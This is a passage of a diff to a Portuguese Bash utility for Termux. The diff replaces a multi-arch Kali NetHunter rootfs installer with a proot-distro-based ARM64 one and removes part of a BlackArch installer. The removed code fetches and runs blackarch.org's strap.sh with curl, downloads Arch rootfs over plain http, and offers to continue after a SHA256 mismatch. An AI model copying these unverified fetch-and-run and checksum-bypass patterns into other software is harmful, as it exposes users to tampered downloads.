+        if [ -n "\$_DOC_PAGER" ]; then _doc_crypto | eval "\$_DOC_PAGER"; else _doc_crypto; fi ;;
+      sys|sistema)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_sys | eval "\$_DOC_PAGER"; else _doc_sys; fi ;;
+      fs|filesystem|arquivos)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_fs | eval "\$_DOC_PAGER"; else _doc_fs; fi ;;
+      ai|cyn|ia)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_ai | eval "\$_DOC_PAGER"; else _doc_ai; fi ;;
+      string|str)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_string | eval "\$_DOC_PAGER"; else _doc_string; fi ;;
+      util)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_util | eval "\$_DOC_PAGER"; else _doc_util; fi ;;
+      json)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_json | eval "\$_DOC_PAGER"; else _doc_json; fi ;;
+      modulos|modules|api)
+        _all_mods() { _doc_net; _doc_mod; _doc_crypto; _doc_sys; _doc_fs; _doc_ai; _doc_string; _doc_util; _doc_json; }
+        if [ -n "\$_DOC_PAGER" ]; then _all_mods | eval "\$_DOC_PAGER"; else _all_mods; fi ;;
+      "")
+        if [ -n "\$_DOC_PAGER" ]; then _doc_body | eval "\$_DOC_PAGER"; else _doc_body; fi ;;
+      *)
+        printf "\033[1;31mSubcomando desconhecido: %s\033[0m\n" "\$_DOC_SUB"
+        printf "  Use: \033[1;32mms --doc\033[0m           # geral\n"
+        printf "       \033[1;32mms --doc modulos\033[0m   # todos os modulos\n"
+        printf "       \033[1;32mms --doc net\033[0m       # net.*\n"
+        printf "       \033[1;32mms --doc mod\033[0m       # mod.*\n"
+        printf "       \033[1;32mms --doc crypto\033[0m    # crypto.*\n"
+        printf "       \033[1;32mms --doc sys\033[0m       # sys.*\n"
+        printf "       \033[1;32mms --doc fs\033[0m        # fs.*\n"
+        printf "       \033[1;32mms --doc ai\033[0m        # ai.*\n"
+        printf "       \033[1;32mms --doc string\033[0m    # extensoes string.*\n"
+        printf "       \033[1;32mms --doc util\033[0m      # stdlib funcional util.*\n"
+        ;;
+    esac
     ;;
   --script)
     shift
@@ -101042,581 +103511,296 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
 
   # ── NetHunter — instala Kali NetHunter sem root (multi-arch) ─────────────
   -nh|--nethunter)
-    printf "\033[1;35m"
-    printf "  ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗ ██████╗ ███████╗\n"
-    printf "  ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝██╔═══██╗██╔════╝\n"
-    printf "  █████╗  ██║     ██║     ██║██║   ██║   ██║   ██║   ██║███████╗\n"
-    printf "  ██╔══╝  ██║     ██║     ██║██║   ██║   ██║   ██║   ██║╚════██║\n"
-    printf "  ███████╗███████╗███████╗██║╚██████╔╝   ██║   ╚██████╔╝███████║\n"
-    printf "  ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝\033[0m\n"
-    printf "\033[0;90m  ─────────────────────────────────────────────────────────────────\033[0m\n"
-    printf "\033[1;35m  ElliotOS — Kali NetHunter Installer (sem root · multi-arch)\033[0m\n"
-    printf "\033[0;90m  by Mike Elliot · github.com/mikeelliot218/ElliotOS\033[0m\n"
-    printf "\033[0;90m  ─────────────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "\033[1;31m"
+    printf "  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97      \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n"
+    printf "  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91      \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n"
+    printf "  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91      \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n"
+    printf "  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91      \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n"
+    printf "  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n"
+    printf "  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n"
+    printf "\033[0m"
+    printf "  \033[1;90m---------------------------------------------------------------------\033[0m\n"
+    printf "  \033[1;31mElliotOS -- Kali Linux NetHunter Installer (sem root . arm64)\033[0m\n"
+    printf "  \033[1;90mby Mike Elliot . github.com/mikeelliot218/ElliotOS\033[0m\n"
+    printf "  \033[1;90m---------------------------------------------------------------------\033[0m\n\n"
 
-    _NH_DIR="\$HOME/.xpm/nethunter"
-    _NH_INSTALLER="\$_NH_DIR/install-nethunter.sh"
-    _NH_ROOTFS="\$HOME/.xpm/kali/rootfs"
-    _PREFIX="\${PREFIX:-/data/data/com.termux/files/usr}"
-    _TMPDIR="\${TMPDIR:-\$_PREFIX/tmp}"
+    CONTAINER="kali"
+    IMAGE="kalilinux/kali-rolling"
+    ARCHITECTURE="arm64"
+    PREFIX="\${PREFIX:-/data/data/com.termux/files/usr}"
+    LAUNCHER="\$PREFIX/bin/nh"
+    info() { printf "  \033[1;36m->\033[0m %s\n" "\$1"; }
+    ok()   { printf "  \033[1;32m[v]\033[0m %s\n" "\$1"; }
+    aviso(){ printf "  \033[1;33m[!]\033[0m %s\n" "\$1"; }
+    erro() { printf "  \033[1;31m[x]\033[0m %s\n" "\$1"; }
 
-    # ── Detecção de arquitetura (inline, sem function) ────────────────────
-    _RAW_ARCH=\$(uname -m 2>/dev/null || printf 'aarch64')
-    case "\$_RAW_ARCH" in
-      aarch64|arm64)      _NH_ARCH="arm64" ;;
-      armv7*|armv8*|armhf*) _NH_ARCH="armhf" ;;
-      x86_64|amd64)       _NH_ARCH="amd64" ;;
-      i686|i386)          _NH_ARCH="i386"  ;;
-      *)                  _NH_ARCH="arm64" ;;
-    esac
-    printf "\033[1;32m  ✓\033[0m Arquitetura: \$_RAW_ARCH → \$_NH_ARCH\n"
-
-    # ── Se installer v3 existe, executa direto ────────────────────────────
-    if [ -f "\$_NH_INSTALLER" ] && grep -q 'ElliotOS-NH-v3' "\$_NH_INSTALLER" 2>/dev/null; then
-      cd "\$_NH_DIR" && bash "\$_NH_INSTALLER"
-      exit 0
-    fi
-
-    # ── Installer ausente ou desatualizado: instala inline ────────────────
-    printf "\033[1;33m  ! Installer não encontrado — executando instalação direta...\033[0m\n\n"
-
-    # Instala dependências
-    printf "\033[1;36m  → Verificando dependências...\033[0m\n"
-    pkg update -y 2>/dev/null || true
-    for _dep in proot wget tar xz curl; do
-      command -v "\$_dep" >/dev/null 2>&1 || pkg install -y "\$_dep" 2>/dev/null || true
-      command -v "\$_dep" >/dev/null 2>&1 && \
-        printf "  \033[1;32m✓\033[0m \$_dep\n" || \
-        printf "  \033[1;33m!\033[0m \$_dep não disponível\n"
-    done
-    command -v proot >/dev/null 2>&1 || { printf "\033[1;31m  ✗ proot não encontrado\033[0m\n"; exit 1; }
-
-    # Opção via proot-distro (mais simples se disponível)
-    if command -v proot-distro >/dev/null 2>&1; then
-      printf "\033[1;36m  → Usando proot-distro (método rápido)...\033[0m\n"
-      proot-distro install kali 2>/dev/null || proot-distro install kali || true
-      if proot-distro list 2>/dev/null | grep -q kali; then
-        printf '#!/data/data/com.termux/files/usr/bin/bash\nexec proot-distro login kali "\$@"\n' \
-          > "\$_PREFIX/bin/nethunter"
-        chmod +x "\$_PREFIX/bin/nethunter"
-        ln -sf "\$_PREFIX/bin/nethunter" "\$_PREFIX/bin/nh" 2>/dev/null
-        printf "\033[1;32m  ✓ Kali instalado via proot-distro. Use: nethunter\033[0m\n"
-        exit 0
-      fi
-    fi
-
-    # Seleciona tipo de rootfs
-    printf "\n  Tipo de instalação:\n"
-    printf "  \033[1;32m1)\033[0m Nano   ~190 MB (mínimo)\n"
-    printf "  \033[1;32m2)\033[0m Mini   ~130 MB \033[0;90m[recomendado]\033[0m\n"
-    printf "  \033[1;32m3)\033[0m Full   >1.5 GB (completo)\n"
-    printf "  Escolha [1/2/3, padrão: 2]: "
-    read -r _choice
-    case "\${_choice:-2}" in
-      1) _TYPE="nano"    ;;
-      3) _TYPE="full"    ;;
-      *) _TYPE="minimal" ;;
-    esac
-
-    # URL direta usando /current/rootfs/ (sempre atualizado)
-    _ARCHIVE="kali-nethunter-rootfs-\${_TYPE}-\${_NH_ARCH}.tar.xz"
-    _FOUND_URL="https://kali.download/nethunter-images/current/rootfs/\${_ARCHIVE}"
-    printf "  \033[1;36m→\033[0m Verificando: \$_FOUND_URL\n"
-    _code=000
-    if command -v curl >/dev/null 2>&1; then
-      _code=\$(curl -sIL --max-time 20 -o /dev/null -w '%{http_code}' "\$_FOUND_URL" 2>/dev/null); [ -n "\$_code" ] || _code='000'
-    elif command -v wget >/dev/null 2>&1; then
-      wget -q --spider --timeout=20 "\$_FOUND_URL" 2>/dev/null && _code=200 || _code=404
-    fi
-    if [ "\$_code" != "200" ]; then
-      printf "\033[1;31m  ✗ Arquivo não encontrado (HTTP \$_code)\033[0m\n"
-      printf "  Verifique: https://kali.download/nethunter-images/current/rootfs/\n"
-      exit 1
-    fi
-    printf "  \033[1;32m✓\033[0m \$_ARCHIVE disponível\n"
-
-    # Download
-    printf "\033[1;36m  → Baixando \$_ARCHIVE ...\033[0m\n"
-    _ARCHIVE_PATH="\$_TMPDIR/\$_ARCHIVE"
-    mkdir -p "\$_TMPDIR"
-    if command -v wget >/dev/null 2>&1; then
-      wget --show-progress -q -c -O "\$_ARCHIVE_PATH" "\$_FOUND_URL" || \
-        { printf "\033[1;31m  ✗ Download falhou\033[0m\n"; exit 1; }
-    else
-      curl -L -C - --progress-bar -o "\$_ARCHIVE_PATH" "\$_FOUND_URL" || \
-        { printf "\033[1;31m  ✗ Download falhou\033[0m\n"; exit 1; }
-    fi
-
-    # Verificação SHA256 dinâmica
-    _SHA_FILE="\$_TMPDIR/\${_ARCHIVE}.sha256sum"
-    _sha_fetched=0
-    if command -v curl >/dev/null 2>&1; then
-      curl -sL --max-time 15 -o "\$_SHA_FILE" "\${_FOUND_URL}.sha256sum" 2>/dev/null && _sha_fetched=1
-    elif command -v wget >/dev/null 2>&1; then
-      wget -q --timeout=15 -O "\$_SHA_FILE" "\${_FOUND_URL}.sha256sum" 2>/dev/null && _sha_fetched=1
-    fi
-    if [ "\$_sha_fetched" = "1" ] && [ -s "\$_SHA_FILE" ] && command -v sha256sum >/dev/null 2>&1; then
-      _exp=\$(awk '{print \$1}' "\$_SHA_FILE")
-      _got=\$(sha256sum "\$_ARCHIVE_PATH" | awk '{print \$1}')
-      if [ "\$_exp" = "\$_got" ]; then
-        printf "  \033[1;32m✓\033[0m SHA256 verificado\n"
-      else
-        printf "  \033[1;33m! SHA256 não corresponde. Continuar? [s/N]\033[0m "
-        read -r _c
-        case "\${_c:-N}" in s|S) : ;; *) rm -f "\$_ARCHIVE_PATH"; exit 1 ;; esac
-      fi
-    else
-      printf "  \033[0;90m! Checksum não disponível — verificação ignorada\033[0m\n"
-    fi
-    rm -f "\$_SHA_FILE" 2>/dev/null
-
-    # Extração
-    printf "\033[1;36m  → Extraindo rootfs...\033[0m\n"
-    mkdir -p "\$_NH_ROOTFS"
-    _NH_ERRLOG="\$_TMPDIR/nethunter-extract.log"
-    : > "\$_NH_ERRLOG"
-    if proot --link2symlink tar -xJf "\$_ARCHIVE_PATH" \
-        --exclude='dev' -C "\$_NH_ROOTFS" --strip-components=1 2>"\$_NH_ERRLOG"; then
-      printf "  \033[1;32m✓\033[0m Extraído com proot --link2symlink\n"
-    elif PROOT_NO_SECCOMP=1 proot --link2symlink tar -xJf "\$_ARCHIVE_PATH" \
-        --exclude='dev' -C "\$_NH_ROOTFS" --strip-components=1 2>>"\$_NH_ERRLOG"; then
-      printf "  \033[1;32m✓\033[0m Extraído com proot --link2symlink (PROOT_NO_SECCOMP=1)\n"
-    else
-      printf "\033[1;31m  ✗ Falha na extração (proot não conseguiu emular os hard links do rootfs)\033[0m\n"
-      printf "\033[0;90m  Últimas linhas do erro:\033[0m\n"
-      tail -n 8 "\$_NH_ERRLOG" 2>/dev/null | sed 's/^/    /'
-      printf "\033[0;90m  Log completo em: \$_NH_ERRLOG\033[0m\n"
-      printf "\033[0;90m  Dica: reinstale/atualize o pacote proot (pkg install proot) e tente de novo.\033[0m\n"
-      exit 1
-    fi
-    rm -f "\$_ARCHIVE_PATH" 2>/dev/null
-    mkdir -p "\$_NH_ROOTFS"/{dev,proc,sys,tmp,run,dev/shm}
-    printf 'nameserver 8.8.8.8\nnameserver 1.1.1.1\n' > "\$_NH_ROOTFS/etc/resolv.conf" 2>/dev/null || true
-
-    # Cria launcher (printf com \n funciona em bash; o ms roda em bash no Termux)
-    mkdir -p "\$_PREFIX/bin"
-    {
-      printf '#!/data/data/com.termux/files/usr/bin/bash\n'
-      printf '# ElliotOS NetHunter launcher\n'
-      printf 'NH_ROOTFS="\${HOME}/.xpm/kali/rootfs"\n'
-      printf '[ ! -d "\$NH_ROOTFS" ] && { echo "NetHunter nao instalado. Execute: ms -nh"; exit 1; }\n'
-      printf 'unset LD_PRELOAD\n'
-      printf '_BINDS="-b /dev -b /proc -b /sys"\n'
-      printf '[ -d /sdcard ] && _BINDS="\$_BINDS -b /sdcard"\n'
-      printf '[ -d /data   ] && _BINDS="\$_BINDS -b /data"\n'
-      printf 'if [ -z "\${PROOT_NO_SECCOMP:-}" ] && ! proot --link2symlink -0 -r "\$NH_ROOTFS" -b /dev true 2>/dev/null; then export PROOT_NO_SECCOMP=1; fi\n'
-      printf 'exec proot --link2symlink -0 -r "\$NH_ROOTFS" \$_BINDS -b "\${HOME}:/root" -w /root /usr/bin/env -i HOME=/root TERM="\${TERM:-xterm-256color}" LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /bin/bash --login "\$@"\n'
-    } > "\$_PREFIX/bin/nethunter"
-    chmod +x "\$_PREFIX/bin/nethunter"
-    ln -sf "\$_PREFIX/bin/nethunter" "\$_PREFIX/bin/nh" 2>/dev/null || \
-      { cp "\$_PREFIX/bin/nethunter" "\$_PREFIX/bin/nh"; chmod +x "\$_PREFIX/bin/nh"; }
-    printf "  \033[1;32m✓\033[0m Launcher criado: nethunter / nh\n" 
-
-    printf "\n\033[1;32m╔══════════════════════════════════════════════════════╗\033[0m\n"
-    printf "\033[1;32m║  Kali NetHunter instalado com sucesso! ✓             ║\033[0m\n"
-    printf "\033[1;32m╚══════════════════════════════════════════════════════╝\033[0m\n\n"
-    printf "  Use: \033[1;36mnethunter\033[0m  ou  \033[1;36mnh\033[0m\n"
-    printf "  Arch: \$_NH_ARCH | Tipo: \$_TYPE\n\n"
-    ;;
-
-  # ── BlackArch — instala Arch Linux + BlackArch sem root (multi-arch) ─────
-  -ba|--blackarch)
-    printf "\033[1;37m"
-    printf "  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ █████╗ ██████╗  ██████╗██╗  ██╗\n"
-    printf "  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
-    printf "  ██████╔╝██║     ███████║██║     █████╔╝ ███████║██████╔╝██║     ███████║\n"
-    printf "  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗██║     ██╔══██║\n"
-    printf "  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║╚██████╗██║  ██║\n"
-    printf "  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m\n"
-    printf "\033[0;90m  ─────────────────────────────────────────────────────────────────\033[0m\n"
-    printf "\033[1;37m  ElliotOS — Arch Linux + BlackArch Installer (sem root · multi-arch)\033[0m\n"
-    printf "\033[0;90m  by Mike Elliot · github.com/mikeelliot218/ElliotOS\033[0m\n"
-    printf "\033[0;90m  ─────────────────────────────────────────────────────────────────\033[0m\n\n"
-
-    _BA_DIR="\$HOME/.xpm/blackarch"
-    _BA_ROOTFS="\$_BA_DIR/rootfs"
-    _PREFIX="\${PREFIX:-/data/data/com.termux/files/usr}"
-    _TMPDIR="\${TMPDIR:-\$_PREFIX/tmp}"
-
-    # ── Detecção de arquitetura (Arch Linux ARM só suporta ARM) ────────────
-    _RAW_ARCH=\$(uname -m 2>/dev/null || printf 'aarch64')
-    case "\$_RAW_ARCH" in
-      aarch64|arm64)        _BA_ARCH="aarch64"; _BA_FILE="ArchLinuxARM-aarch64-latest.tar.gz" ;;
-      armv7*|armv8*|armhf*) _BA_ARCH="armv7";   _BA_FILE="ArchLinuxARM-armv7-latest.tar.gz"   ;;
-      *)
-        printf "\033[1;31m  ✗ Arquitetura '\$_RAW_ARCH' não suportada pelo Arch Linux ARM (só ARM: aarch64/armv7)\033[0m\n"
+    if [ ! -d "\$PREFIX" ]; then
+        erro "Este script precisa ser executado no Termux."
         exit 1
-        ;;
+    fi
+
+    HOST_ARCH="\$(uname -m)"
+    info "Arquitetura do dispositivo: \$HOST_ARCH"
+    case "\$HOST_ARCH" in
+        aarch64|arm64) ok "ARM64 detectado." ;;
+        *) erro "Este script e destinado a dispositivos ARM64."; exit 1 ;;
     esac
-    printf "\033[1;32m  ✓\033[0m Arquitetura: \$_RAW_ARCH → \$_BA_ARCH\n"
 
-    if [ -d "\$_BA_ROOTFS/etc" ] && [ -f "\$_PREFIX/bin/blackarch" ]; then
-      printf "\033[1;33m  ! BlackArch já instalado em \$_BA_ROOTFS\033[0m\n"
-      printf "  Use: \033[1;36mblackarch\033[0m  ou  \033[1;36mba\033[0m  para entrar\n"
-      printf "  Para reinstalar do zero, apague \$_BA_DIR e rode \033[1;32mms -ba\033[0m de novo.\n\n"
-      exit 0
+    if ! command -v proot-distro >/dev/null 2>&1; then
+        aviso "PRoot-Distro nao esta instalado."
+        info "Instalando pelo Termux..."
+        pkg update
+        pkg install -y proot-distro
+    fi
+    ok "PRoot-Distro encontrado."
+    printf "\n"
+    proot-distro version || true
+    printf "\n"
+
+    info "Verificando dependencias do Termux..."
+    pkg install -y curl grep
+    ok "Dependencias prontas."
+    printf "\n"
+
+    CONTAINER_EXISTE=0
+    if proot-distro list --quiet 2>/dev/null | grep -Fxq "\$CONTAINER"; then
+        CONTAINER_EXISTE=1
     fi
 
-    # Instala dependências
-    printf "\033[1;36m  → Verificando dependências...\033[0m\n"
-    pkg update -y 2>/dev/null || true
-    # libarchive fornece bsdtar, que converte hard links em cópias automaticamente
-    # (o tar padrão do Termux nao suporta --hard-dereference e falha no Android)
-    pkg install -y libarchive 2>/dev/null || true
-    for _dep in proot proot-distro wget tar gzip curl bsdtar; do
-      command -v "\$_dep" >/dev/null 2>&1 || pkg install -y "\$_dep" 2>/dev/null || true
-      command -v "\$_dep" >/dev/null 2>&1 && \
-        printf "  \033[1;32m✓\033[0m \$_dep\n" || \
-        printf "  \033[1;33m!\033[0m \$_dep não disponível\n"
-    done
-    command -v proot >/dev/null 2>&1 || { printf "\033[1;31m  ✗ proot não encontrado\033[0m\n"; exit 1; }
-
-    # ── Download do rootfs ArchLinux ARM ─────────────────────────────────────────
-    # O proot-distro 5.x usa Docker Hub e o archlinux nao tem imagem arm64 lá.
-    # Solução: baixar o tarball oficial e instalar via "proot-distro install ./arquivo",
-    # que converte hard links em cópias internamente (sem precisar do tar nem bsdtar).
-    _BA_URL="http://os.archlinuxarm.org/os/\$_BA_FILE"
-    printf "  \033[1;36m→\033[0m Verificando: \$_BA_URL\n"
-    _code=000
-    if command -v curl >/dev/null 2>&1; then
-      _code=\$(curl -sIL --max-time 20 -o /dev/null -w '%{http_code}' "\$_BA_URL" 2>/dev/null); [ -n "\$_code" ] || _code='000'
-    elif command -v wget >/dev/null 2>&1; then
-      wget -q --spider --timeout=20 "\$_BA_URL" 2>/dev/null && _code=200 || _code=404
-    fi
-    if [ "\$_code" != "200" ]; then
-      printf "\033[1;31m  ✗ Arquivo não encontrado (HTTP \$_code)\033[0m\n"
-      printf "  Verifique: https://archlinuxarm.org/about/downloads\n"
-      exit 1
-    fi
-    printf "  \033[1;32m✓\033[0m \$_BA_FILE disponível\n"
-
-    printf "\033[1;36m  → Baixando \$_BA_FILE ...\033[0m\n"
-    _BA_ARCHIVE_PATH="\$_TMPDIR/\$_BA_FILE"
-    mkdir -p "\$_TMPDIR"
-    if command -v wget >/dev/null 2>&1; then
-      wget --show-progress -q -c -O "\$_BA_ARCHIVE_PATH" "\$_BA_URL" || \
-        { printf "\033[1;31m  ✗ Download falhou\033[0m\n"; exit 1; }
+    if [ "\$CONTAINER_EXISTE" -eq 1 ]; then
+        aviso "O container '\$CONTAINER' ja existe."
+        info "O container existente sera reutilizado."
     else
-      curl -L -C - --progress-bar -o "\$_BA_ARCHIVE_PATH" "\$_BA_URL" || \
-        { printf "\033[1;31m  ✗ Download falhou\033[0m\n"; exit 1; }
+        info "Instalando Kali Linux ARM64..."
+        info "Imagem: \$IMAGE"
+        proot-distro install \
+            --name "\$CONTAINER" \
+            --architecture "\$ARCHITECTURE" \
+            "\$IMAGE"
+        ok "Kali Linux ARM64 instalado."
     fi
+    printf "\n"
 
-    # ── Instalação via proot-distro (método recomendado) ────────────────────────
-    # proot-distro install <local.tar.gz> converte hard links em cópias internamente,
-    # resolvendo "Cannot hard link / Function not implemented" no kernel Android.
-    _BA_USE_PD=0
-    if command -v proot-distro >/dev/null 2>&1; then
-      printf "\033[1;36m  → Instalando rootfs via proot-distro install (resolve hard links)...\033[0m\n"
-      # Remove instalação anterior caso exista
-      proot-distro remove archlinux 2>/dev/null || true
-      if proot-distro install "\$_BA_ARCHIVE_PATH" --name archlinux 2>/dev/null || \
-         proot-distro install "\$_BA_ARCHIVE_PATH" --name archlinux; then
-        if proot-distro list 2>/dev/null | grep -q archlinux; then
-          printf "  \033[1;32m✓\033[0m Rootfs instalado via proot-distro\n"
-          _BA_USE_PD=1
-        fi
-      fi
-      if [ "\$_BA_USE_PD" = "0" ]; then
-        printf "\033[1;33m  ! proot-distro install falhou — tentando Python...\033[0m\n"
-      fi
-    fi
+    info "Entrando no container para configurar o sistema..."
 
-    # ── Fallback: extração via Python (converte hard links em shutil.copy2) ──────
-    if [ "\$_BA_USE_PD" = "0" ]; then
-      printf "\033[1;36m  → Extraindo rootfs via Python...\033[0m\n"
-      mkdir -p "\$_BA_ROOTFS"
-      _BA_ERRLOG="\$_TMPDIR/blackarch-extract.log"
-      if command -v python3 >/dev/null 2>&1; then
-        python3 - "\$_BA_ARCHIVE_PATH" "\$_BA_ROOTFS" 2>"\$_BA_ERRLOG" << 'PYEOF'
-import tarfile, os, shutil, sys
-archive, dest = sys.argv[1], sys.argv[2]
-pending = {}
-with tarfile.open(archive, 'r:gz') as tf:
-    for m in tf.getmembers():
-        n = m.name.lstrip('./')
-        if n.startswith('dev') or n == '':
-            continue
-        if m.islnk():
-            pending.setdefault(m.linkname.lstrip('./'), []).append(n)
-        else:
-            m.name = n
-            try:
-                tf.extract(m, dest, set_attrs=False)
-            except Exception:
-                pass
-            for lname in pending.pop(n, []):
-                dst = os.path.join(dest, lname)
-                os.makedirs(os.path.dirname(dst), exist_ok=True)
-                src = os.path.join(dest, n)
-                if os.path.exists(src):
-                    try: shutil.copy2(src, dst)
-                    except Exception: pass
-for target, names in pending.items():
-    src = os.path.join(dest, target)
-    for lname in names:
-        dst = os.path.join(dest, lname)
-        os.makedirs(os.path.dirname(dst), exist_ok=True)
-        if os.path.exists(src):
-            try: shutil.copy2(src, dst)
-            except Exception: pass
-PYEOF
-        if [ -d "\$_BA_ROOTFS/usr" ]; then
-          printf "  \033[1;32m✓\033[0m Extraído via Python\n"
-        else
-          printf "\033[1;31m  ✗ Falha na extração Python\033[0m\n"
-          tail -n 8 "\$_BA_ERRLOG" 2>/dev/null | sed 's/^/    /'
-          exit 1
-        fi
-      else
-        printf "\033[1;31m  ✗ Python3 não encontrado — instale: pkg install python\033[0m\n"
-        exit 1
-      fi
-      rm -f "\$_BA_ARCHIVE_PATH" 2>/dev/null
-      mkdir -p "\$_BA_ROOTFS/dev"
-      mkdir -p "\$_BA_ROOTFS/dev/shm"
-      mkdir -p "\$_BA_ROOTFS/proc"
-      mkdir -p "\$_BA_ROOTFS/sys"
-      mkdir -p "\$_BA_ROOTFS/tmp"
-      mkdir -p "\$_BA_ROOTFS/run"
-      mkdir -p "\$_BA_ROOTFS/etc"
-      # Escreve resolv.conf para DNS dentro do proot
-      printf 'nameserver 8.8.8.8\nnameserver 1.1.1.1\n' > "\$_BA_ROOTFS/etc/resolv.conf" || true
-    fi
+    proot-distro login "\$CONTAINER" -- bash <<'KALI_SCRIPT'
 
-    rm -f "\$_BA_ARCHIVE_PATH" 2>/dev/null
-
-    # ── Bootstrap BlackArch ──────────────────────────────────────────────────────
-    printf "\033[1;36m  → Rodando bootstrap do BlackArch (pacman-key + strap.sh)...\033[0m\n\n"
-    _STRAP='
 set -e
 
-# Fix DNS: proot nao tem systemd-resolved; garante resolv.conf com IPs publicos
-# e troca nsswitch.conf de "resolve" para "dns" (que funciona sem systemd)
-printf "nameserver 8.8.8.8\nnameserver 1.1.1.1\n" > /etc/resolv.conf
-if [ -f /etc/nsswitch.conf ]; then
-  sed -i "s/^hosts:.*/hosts: files dns/" /etc/nsswitch.conf 2>/dev/null || true
-else
-  printf "hosts: files dns\n" > /etc/nsswitch.conf
+info() { printf "  \033[1;36m->\033[0m %s\n" "\$1"; }
+ok()   { printf "  \033[1;32m[v]\033[0m %s\n" "\$1"; }
+aviso(){ printf "  \033[1;33m[!]\033[0m %s\n" "\$1"; }
+erro() { printf "  \033[1;31m[x]\033[0m %s\n" "\$1"; }
+
+printf "\n"
+printf "  \033[1;37m+------------------------------------------+\033[0m\n"
+printf "  \033[1;37m|           KALI LINUX NETHUNTER           |\033[0m\n"
+printf "  \033[1;37m+------------------------------------------+\033[0m\n"
+printf "\n"
+
+info "Arquitetura:"
+uname -m
+
+if [ -f /etc/os-release ]; then
+    . /etc/os-release
+    printf "  \033[1;36m->\033[0m Sistema: \${PRETTY_NAME:-Kali Linux}\n"
 fi
 
-# pacman 6.1+ tenta usar Landlock (sandbox do kernel) e o usuario "alpm",
-# nenhum dos dois funciona dentro do proot no Android.
-# DisableSandbox desativa ambos sem afetar funcionalidade do gerenciador.
-if [ -f /etc/pacman.conf ]; then
-  if ! grep -q "^DisableSandbox" /etc/pacman.conf; then
-    sed -i "/^\[options\]/a DisableSandbox" /etc/pacman.conf 2>/dev/null || \
-      echo "DisableSandbox" >> /etc/pacman.conf
-  fi
+if ! command -v apt >/dev/null 2>&1; then
+    erro "apt nao foi encontrado. Container invalido."
+    exit 1
+fi
+ok "apt encontrado."
+
+printf "\n"
+info "Configurando Portugues Brasileiro..."
+
+export DEBIAN_FRONTEND=noninteractive
+apt-get update -qq
+apt-get install -y -qq locales 2>/dev/null || true
+
+if [ -f /etc/locale.gen ]; then
+    sed -i 's/^# *pt_BR.UTF-8 UTF-8/pt_BR.UTF-8 UTF-8/' /etc/locale.gen
+    grep -q '^pt_BR.UTF-8 UTF-8' /etc/locale.gen || echo 'pt_BR.UTF-8 UTF-8' >> /etc/locale.gen
+    locale-gen 2>/dev/null || true
 fi
 
-pacman-key --init
-pacman-key --populate archlinuxarm
-pacman -Syu --noconfirm --needed curl ca-certificates
-cd /root
-curl -fO https://blackarch.org/strap.sh
-chmod +x strap.sh
-./strap.sh
-pacman -Syu --noconfirm
-echo "[blackarch] pronto."
-'
-    if [ "\$_BA_USE_PD" = "1" ]; then
